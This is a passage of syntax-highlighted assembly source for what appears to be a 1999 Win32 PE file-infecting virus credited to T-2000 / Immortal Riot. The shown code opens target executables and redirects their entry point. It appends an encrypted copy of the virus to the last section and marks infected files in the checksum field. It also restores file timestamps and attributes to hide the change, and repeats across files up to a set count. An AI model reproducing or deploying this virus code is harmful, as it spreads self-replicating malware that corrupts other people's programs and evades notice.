                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Close_Handle</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc1">; Calculate position of the last section-header.</span><span class="sc0">

                </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.Number_Of_Sections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

                </span><span class="sc1">; Calculate size of PE-header.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.NT_Header_Size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Start section-headers.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">                </span><span class="sc1">; EAX = last section-header.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc1">; Seek to last section-header.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_File</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Last_Section_Header</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">                </span><span class="sc1">; Read last section-header.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Read_File</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Section_RVA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Section_Physical_Size</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Base_Displ</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">EBX.EIP_RVA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Old_EIP_RVA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc1">; Seek to the end of the section.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Section_Physical_Offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Section_Physical_Size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_File</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Section_Physical_Size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.File_Align</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Align_EAX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ESI.Section_Physical_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Save physical-size in EDI.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Section_Virtual_Size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.Object_Align</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Calc_Mem_Size</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Align_EAX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                </span><span class="sc1">; Virtual-size may not be</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Calc_Mem_Size</span><span class="sc0">           </span><span class="sc1">; smaller than physical-size.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ESI.Section_Virtual_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.Section_RVA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.Object_Align</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Align_EAX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.Image_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc1">; Set section-flags: read, write, executable, code.</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc5">ESI.Section_Flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11100000000000000000000000100000b</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">PUSHAD</span><span class="sc0">

                </span><span class="sc1">; Get a random slide-key.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetTickCount</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Init_Slide</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc1">; Get a random encryption-key.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">GetTickCount</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Init_Key</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">                   </span><span class="sc1">; MOVSD takes one more byte,</span><span class="sc0">
                                                </span><span class="sc1">; gotta be compact you know.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">Encrypted</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">Encrypt_DWORD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">RCL</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Encrypt_DWORD</span><span class="sc0">

                </span><span class="sc6">POPAD</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                </span><span class="sc1">; Write virusbody to end</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">         </span><span class="sc1">; of the last section.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Offset last object-header.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_File</span><span class="sc0">

                </span><span class="sc1">; Write updated section-header back to file.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Last_Section_Header</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc1">; Seek to end of file.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetFilePointer</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                </span><span class="sc1">; Zero-pad the infected file.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.File_Align</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                </span><span class="sc1">; File is already aligned?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Mark_Inf_File</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                </span><span class="sc1">; Howmany bytes to pad?</span><span class="sc0">

</span><span class="sc5">Zero_Pad</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Write a padding-byte.</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Zero_Tolerance</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">                     </span><span class="sc1">; We've did 'em all?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Zero_Pad</span><span class="sc0">

</span><span class="sc5">Mark_Inf_File</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBX.Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Seek to start of PE-header.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Seek_File</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">92</span><span class="sc0">                 </span><span class="sc1">; Write updated PE-header.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_File</span><span class="sc0">

                </span><span class="sc1">; Increment our infection-counter.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Counter</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Restore original file-dates &amp; times.</span><span class="sc0">

</span><span class="sc5">Restore_Stamp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Time_Last_Write</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetFileTime</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Close_Handle</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">CloseHandle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Restore_Attr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetFileAttributesA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Exit_Infect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POPAD</span><span class="sc0">

                </span><span class="sc1">; We've did enough infections?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Infect_Counter</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc5">Max_Infect</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Close_Find</span><span class="sc0">

                </span><span class="sc1">; Find another file.</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Search_Record</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">FindNextFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Continue if search went OK.</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Infect_Loop</span><span class="sc0">

</span><span class="sc5">Close_Find</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">                     </span><span class="sc1">; Close search-handle.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">FindClose</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Exit_Inf_Dir</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POPAD</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; EAX = Offset.</span><span class="sc0">
</span><span class="sc1">; Returns ZF if error.</span><span class="sc0">
</span><span class="sc5">Seek_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">SetFilePointer</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; EBX = Buffer.</span><span class="sc0">
</span><span class="sc1">; ECX = Bytes to read.</span><span class="sc0">
</span><span class="sc1">; Returns ZF if successful.</span><span class="sc0">
</span><span class="sc5">Read_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Bytes_Read</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">ReadFile</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">; ECX = Amount of bytes.</span><span class="sc0">
</span><span class="sc1">; EDX = Buffer.</span><span class="sc0">
</span><span class="sc1">; Returns ZF if successful.</span><span class="sc0">
</span><span class="sc5">Write_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">Bytes_Read</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">File_Handle</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+(</span><span class="sc5">WriteFile</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">Align_EAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                </span><span class="sc1">; Even division?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">No_Round</span><span class="sc0">                </span><span class="sc1">; Then no need to round-up.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">; Round-up.</span><span class="sc0">

</span><span class="sc5">No_Round</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

                </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">Copyright</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'(c) 1999 T-2000 / Immortal Riot.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Upcase_EAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
